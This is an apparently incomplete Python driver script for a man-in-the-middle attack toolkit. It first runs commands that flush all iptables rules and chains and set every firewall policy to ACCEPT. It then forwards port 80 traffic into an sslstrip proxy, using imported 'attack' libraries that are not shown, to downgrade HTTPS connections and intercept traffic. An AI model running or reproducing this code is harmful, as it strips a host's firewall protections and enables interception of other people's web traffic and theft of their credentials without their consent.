import os
import re
import sys
import time
import warnings


os.system('iptables -F')
os.system('iptables -X')
os.system('iptables -t nat -F')
os.system('iptables -t nat -X')
os.system('iptables -t mangle -F')
os.system('iptables -t mangle -X')
os.system('iptables -P INPUT ACCEPT')
os.system('iptables -P FORWARD ACCEPT')
os.system('iptables -P OUTPUT ACCEPT')
      

#Import DB Libs
#from lib.GUIServer import *

#Import Attack Libs
from lib.feeds import *
from lib.metafeeds import *
from lib.consumers import *

#MITMServer should be spawned as a background process PID tracked in DB and killed on stop (Ctrl-Z)

#Main Execution
#while True:
   #Check settings for active attack components
   #Compare to running jobs list
   #Kill all jobs not active
   
joba = 1
FEED_PORT = 80
PROXY_PORT = 10000


#Startup new jobs
if joba == 1:
   #Exec attack
   rawPacket().portProxy(FEED_PORT, PROXY_PORT)
   sslstrip().proxy(PROXY_PORT)
   
   #Set running job & begin PID tracking
   joba = 0
   
   
   
   #Rinse and repeat